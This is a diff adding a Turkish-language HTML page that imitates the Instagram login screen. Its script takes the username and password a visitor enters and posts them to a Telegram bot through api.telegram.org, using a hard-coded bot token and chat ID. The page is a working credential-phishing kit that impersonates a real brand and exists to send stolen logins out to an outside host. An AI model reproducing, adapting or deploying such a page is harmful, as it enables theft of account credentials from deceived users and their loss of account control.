@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            width: 350px;
+            padding: 40px;
+            background-color: white;
+            border: 1px solid #ddd;
+            text-align: center;
+        }
+        .container h1 {
+            font-size: 3em;
+            font-family: 'Billabong', cursive;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #3578e5;
+        }
+        .forgot {
+            margin-top: 20px;
+            color: #00376b;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Instagram</h1>
+        <div class="input-group">
+            <input type="text" id="name" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Şifre">
+        </div>
+        <button id="btn" onclick="gonder()" class="login-btn">Giriş Yap</button>
+        <p class="forgot">Şifreni mi unuttun?</p>
+    </div>
+    
+    <script>
+     function gonder(){
+     var name = document.getElementById("name").value;
+     var kod = document.getElementById("password").value;
+     console.log(`Name: ${name} Password: ${kod}`) 
+     const mesaj = `Name: ${name} Password: ${kod}`
+     
+     fetch('https://api.telegram.org/bot7305999237:AAEZKowGcSZWf3btGW0dYOtT2TWlwpxXlzY/sendMessage', {
+      method: 'POST',
+      headers: {
+      'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+      chat_id: '6726703804',  // Sizin Chat ID'niz
+      text: mesaj             // Entry'den alınan mesajı gönderiyoruz
+      })
+      })}
+    </script>
+</body>
+</html>
